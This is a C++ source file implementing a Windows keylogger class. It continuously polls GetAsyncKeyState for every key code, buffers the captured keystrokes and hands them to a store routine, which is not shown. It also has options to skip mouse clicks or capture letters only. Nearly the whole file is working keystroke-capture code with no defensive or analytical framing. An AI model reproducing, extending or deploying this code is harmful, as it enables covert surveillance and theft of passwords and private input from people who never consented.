#include "./keylogger.hpp"

keylogger::keylogger(size_t p_buffer_size)
{
	a_buffer_size = p_buffer_size;

	a_buffer = new string();
}

keylogger::~keylogger()
{
	delete a_buffer;
}

void keylogger::start()
{
	while (TRUE)
		for (int t_key = 1; t_key < 255; t_key++)
			if (GetAsyncKeyState(t_key) == -32767)
			{
				if(a_no_click == true && (t_key == 1 || t_key == 2))
				{

				}
				else
				{
					if(a_alphabet_only == true && (t_key < 65 || t_key > 122))
						break;

					a_buffer->push_back(t_key);

					if(a_buffer->length() == a_buffer_size)
					{
						store();

						a_buffer->clear();
					}
				}
			}
}

void keylogger::set_buffer_size(size_t p_new_buffer_size)
{
	a_buffer_size = p_new_buffer_size;
}

void keylogger::set_no_click(bool p_no_click)
{
	a_no_click = p_no_click;
}

void keylogger::set_alphabet_only(bool p_alphabet_only)
{
	a_alphabet_only = p_alphabet_only;
}

void keylogger::set_store_character(bool p_store_character)
{
	a_store_character = p_store_character;
}
